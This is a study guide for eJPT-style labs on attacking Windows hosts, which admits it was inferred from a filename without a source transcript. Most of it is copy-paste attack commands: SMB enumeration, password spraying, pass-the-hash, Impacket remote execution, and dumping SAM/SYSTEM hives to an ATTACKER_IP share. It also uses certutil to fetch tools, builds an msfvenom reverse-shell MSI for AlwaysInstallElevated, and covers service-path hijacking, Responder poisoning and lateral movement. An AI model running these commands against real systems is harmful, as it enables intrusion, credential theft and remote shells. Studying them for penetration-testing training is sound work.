# 01 - Overview Of Windows Vulnerabilities

Note: The transcript wasn’t provided. The following is a conservative, eJPT-oriented overview inferred from the filename and module context. Commands and flow reflect common Windows-targeted techniques you’ll see in eJPT-style labs.

## What the video covers (Introduction / big picture)
- High-level attack surface of Windows hosts:
  - Network-exposed services (SMB, RDP, WinRM, RPC/DCOM)
  - Authentication/credential weaknesses (weak passwords, NTLM/LM hashes, pass-the-hash, LLMNR/NBT-NS poisoning)
  - Patch-related remote exploits (e.g., MS17-010/EternalBlue on SMB)
  - Misconfigurations leading to privilege escalation (unquoted service paths, AlwaysInstallElevated, weak service permissions, token impersonation)
- Typical attack chain:
  1) Enumerate the host and services
  2) Check for known vulns and weak configurations
  3) Gain a foothold (valid creds, remote code execution)
  4) Escalate privileges to Administrator/SYSTEM
  5) Dump credentials and move laterally
- Practical mindset for Windows:
  - Identify OS and patch level quickly
  - Focus on SMB shares, RDP/WinRM access, and credentials
  - Use built-in Windows/PowerShell where possible (less noisy)
  - Keep an eye on 32-bit vs 64-bit tooling

## Flow (ordered)
1. Discover and fingerprint Windows hosts (Nmap)
2. Enumerate SMB (shares, users, vulnerabilities like MS17-010)
3. Probe RDP and WinRM for remote access potential
4. Try null/guest access; then credential guessing/spraying (carefully)
5. With creds, attempt remote execution (SMB/PSExec, WinRM, RDP)
6. Post-exploitation: dump hashes/creds (LSA/SAM/LSASS) and enumerate for privesc
7. Local privilege escalation checks (winPEAS, AlwaysInstallElevated, services)
8. Optional: LLMNR/NBT-NS poisoning to capture hashes; crack and re-use
9. Lateral movement with harvested creds/hashes
10. Document findings and remediation (patching, hardening, policy fixes)

## Tools highlighted
- Nmap: service/OS discovery, SMB/RDP/WinRM NSE scripts
- enum4linux-ng / smbclient / rpcclient: SMB and RPC enumeration
- CrackMapExec (CME): SMB enumeration, credential validation, spraying, shares
- Impacket: psexec.py, smbexec.py, wmiexec.py, secretsdump.py, smbclient.py
- Evil-WinRM: interactive PowerShell sessions over WinRM
- xfreerdp: RDP client
- Responder: LLMNR/NBT-NS poisoning to capture NTLM hashes
- Hashcat/John: password cracking
- winPEAS / Seatbelt: local Windows privilege escalation checks
- Sysinternals/LOLBins (sc.exe, wmic, reg, icacls, schtasks, certutil): enumeration/exploitation on host

## Typical command walkthrough (detailed, copy-paste friendly)
Adjust IPs, usernames, and paths as needed.

Set common variables to speed up copy/paste:
```bash
export TARGET=10.10.10.10
export ATTACKER_IP=10.10.14.2
export USER=Administrator
export PASS='Password123!'
```

1) Discovery and fingerprinting
```bash
# Full TCP scan, default scripts, version detection, OS guess
sudo nmap -p- -sS -sC -sV -O -T4 --min-rate 2000 $TARGET

# Focus on Windows-typical ports if you’re time-bound
sudo nmap -p135,139,445,3389,5985,5986 -sC -sV -T4 $TARGET

# SMB vulns and info (some scripts may be deprecated in your distro; use what’s available)
sudo nmap -p445 --script "smb-enum-*,smb2-security-mode,smb2-time" $TARGET
sudo nmap -p445 --script smb-vuln-ms17-010 $TARGET  # if present
```

2) SMB enumeration (shares, users, null sessions)
```bash
# List shares with null session
smbclient -N -L //$TARGET/

# Try connecting to a share
smbclient -N //$TARGET/SHARE

# Deeper enumeration
enum4linux-ng -A $TARGET

# RPC null session (if allowed)
rpcclient -U "" -N $TARGET -c "enumdomusers; enumdomgroups; querydominfo"
```

3) Credential checking and basic spraying (low-and-slow)
```bash
# Validate creds and enumerate shares with CrackMapExec (CME)
cme smb $TARGET -u $USER -p $PASS --shares
cme smb $TARGET -u $USER -p $PASS --local-auth   # if local account

# Try pass-the-hash with NTLM (replace NTHASH)
cme smb $TARGET -u $USER -H NTHASH --shares

# Check password policy (if accessible)
cme smb $TARGET -u $USER -p $PASS --pass-pol
```

4) Check MS17-010 and other SMB weaknesses
```bash
sudo nmap -p445 --script smb-vuln-ms17-010 $TARGET
# Optional Metasploit route (if allowed)
# msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run; exit"
```

5) RDP and WinRM probes
```bash
# RDP info and encryption
sudo nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info $TARGET

# WinRM detect
sudo nmap -p5985,5986 -sV $TARGET
```

6) Remote access with credentials
```bash
# RDP
xfreerdp /v:$TARGET /u:$USER /p:$PASS /dynamic-resolution /cert:ignore

# WinRM (PowerShell)
evil-winrm -i $TARGET -u $USER -p $PASS
# Or with NTLM hash (if supported by your Evil-WinRM build)
# evil-winrm -i $TARGET -u $USER -H NTHASH
```

7) Remote exec over SMB (Impacket)
```bash
# PSExec-like (creates a service; often needs Admin rights)
python3 /usr/share/doc/python3-impacket/examples/psexec.py $USER:$PASS@$TARGET
# Pass-the-hash
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :NTHASH $USER@$TARGET

# WMI exec (quieter service artifacts than PSExec)
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $USER:$PASS@$TARGET
```

8) Post-exploitation: dump creds/hashes
```bash
# Remote dump (requires Admin; uses RemoteRegistry/registry hives)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py $USER:$PASS@$TARGET

# If you have a shell on the host, save hives for offline dump
reg.exe save hklm\sam C:\Windows\Temp\sam.save
reg.exe save hklm\system C:\Windows\Temp\system.save
reg.exe save hklm\security C:\Windows\Temp\security.save

# Copy hives back to your box (e.g., with SMB or certutil/http)
# Serve an SMB share from your attack box
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share $(pwd)
# From victim, copy files to your share (adjust path):
copy C:\Windows\Temp\sam.save \\$ATTACKER_IP\share\
copy C:\Windows\Temp\system.save \\$ATTACKER_IP\share\
copy C:\Windows\Temp\security.save \\$ATTACKER_IP\share\

# Offline dump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

9) Local privilege escalation checks
```bash
# Quick OS/user/context checks
whoami
whoami /priv
systeminfo
ipconfig /all
net localgroup administrators
net user
net user $USER

# Download and run winPEAS (start a web server on attacker)
cd ~/tools && python3 -m http.server 80
# On victim
certutil -urlcache -f http://$ATTACKER_IP/winPEASx64.exe C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe
```

10) Common privesc paths

- AlwaysInstallElevated
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both return 0x1:
```bash
# Generate MSI payload (lab use; may be flagged in real environments)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f msi -o aie.msi
# Serve and download
python3 -m http.server 80
# On victim
certutil -urlcache -f http://$ATTACKER_IP/aie.msi C:\Windows\Temp\aia.msi
# Listener
rlwrap -cAr nc -lvnp 4444
# Execute
msiexec /quiet /qn /i C:\Windows\Temp\aia.msi
```

- Unquoted service path
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows" | findstr /i " "
# Inspect a target service
sc qc "VulnService"
icacls "C:\Program Files\Vuln App\"   # Check write perms
# If writable, place a malicious exe at the vulnerable path segment and restart the service:
copy C:\Windows\Temp\payload.exe "C:\Program Files\Vuln App\Program.exe"
sc stop "VulnService" && sc start "VulnService"
```

- Token impersonation (SeImpersonatePrivilege)
```cmd
whoami /priv  # Look for SeImpersonatePrivilege: Enabled
```
If enabled (and OS vulnerable to your chosen technique), use a known tool (lab context), e.g., PrintSpoofer:
```cmd
# On victim (assuming you uploaded PrintSpoofer64.exe)
C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd.exe
```

11) LLMNR/NBT-NS poisoning and cracking (optional lab technique)
```bash
# Run Responder (choose correct interface)
sudo responder -I tun0 -rdwv

# When you capture NTLMv2 hashes, crack with hashcat or john
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt --force
# or
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt captured_hashes.txt
```

12) Lateral movement example
```bash
# With new creds/hashes, enumerate more targets
cme smb 10.10.10.0/24 -u USER -p 'NewPass123!' --shares
# Or pass-the-hash
cme smb 10.10.10.0/24 -u USER -H NTHASH --shares
# Gain shell on new target
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :NTHASH USER@10.10.10.20
```

## Practical tips
- Identify OS and patch level early (systeminfo, Nmap banner/version data).
- SMB is your friend: check shares, null sessions, and MS17-010 quickly.
- WinRM often yields a stable PowerShell foothold if you have creds.
- Prefer pass-the-hash when possible; you don’t need the cleartext password.
- Keep a credential notebook: users, local vs domain, hashes, where they worked.
- Check 32-bit vs 64-bit before running tools; use matching binaries.
- For privesc, start with winPEAS, then validate specific avenues (services, registry, privileges).
- Be mindful of noisy actions (e.g., brute-force). In real environments, use slow spray and timing.
- If secretsdump fails remotely, try enabling RemoteRegistry or dump hives locally and extract offline.
- Some Nmap NSE scripts (smb-vuln-ms17-010) may be missing/deprecated in your distro; use alternatives (CME checks, Metasploit aux, manual fingerprints).

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Scan
sudo nmap -p- -sC -sV -O -T4 $TARGET

# 2) SMB enum
smbclient -N -L //$TARGET/
enum4linux-ng -A $TARGET
sudo nmap -p445 --script smb-vuln-ms17-010 $TARGET

# 3) RDP/WinRM
sudo nmap -p3389,5985,5986 -sC -sV $TARGET

# 4) Creds check
cme smb $TARGET -u $USER -p $PASS --shares
cme smb $TARGET -u $USER -H NTHASH --shares

# 5) Remote exec
python3 $(locate psexec.py | head -n1) $USER:$PASS@$TARGET
# or
evil-winrm -i $TARGET -u $USER -p $PASS

# 6) Dump creds
python3 $(locate secretsdump.py | head -n1) $USER:$PASS@$TARGET

# 7) Privesc (on victim)
whoami /priv
systeminfo
certutil -urlcache -f http://$ATTACKER_IP/winPEASx64.exe C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe

# 8) Common privesc checks
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows" | findstr /i " "

# 9) Lateral movement
cme smb 10.10.10.0/24 -u USER -H NTHASH --shares
```

## Summary
- Windows targets expose rich attack surfaces via SMB, RDP, and WinRM; prioritize enumerating these services.
- Combine credential-focused approaches (null sessions, spraying, pass-the-hash) with patch-based checks (MS17-010) for quick footholds.
- After access, dump credentials and run structured privesc checks (winPEAS, registry, services, privileges).
- Re-use harvested creds/hashes to move laterally.
- Keep your approach methodical: enumerate → validate → exploit → escalate → dump → pivot, and always map findings to clear remediation (patching, disabling LLMNR, hardening shares/services, enforcing strong passwords).